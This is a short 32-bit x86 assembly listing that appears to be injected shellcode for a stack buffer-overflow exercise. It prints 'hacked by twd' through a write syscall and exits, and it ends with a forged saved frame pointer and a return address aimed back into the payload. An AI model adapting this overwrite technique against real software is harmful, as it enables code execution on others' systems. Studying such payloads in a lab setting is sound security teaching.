.text
# start @0xbffffa4c
hack:
	movl  $0xbffffa30, %esp
	pushl $14
	pushl $0xbffffa80       # str
	pushl $1
	movl  (%esp), %ebx
	movl  $0xbffffa80, %ecx
	movl  8(%esp), %edx
	xorl  %eax, %eax
	movb  $4, %al
	int   $0x80             # write
	xor   %ebx, %ebx
	movl  %ebx, (%esp)
	xorl  %eax, %eax
	movb  $0xfc, %al
	int   $0x80           # exit
	nop
	.long 0xbffffaf8		# ebp (solely to make gdb happy)
	.long 0xbffffa4c		# hack
str:
	.string "hacked by twd\n"
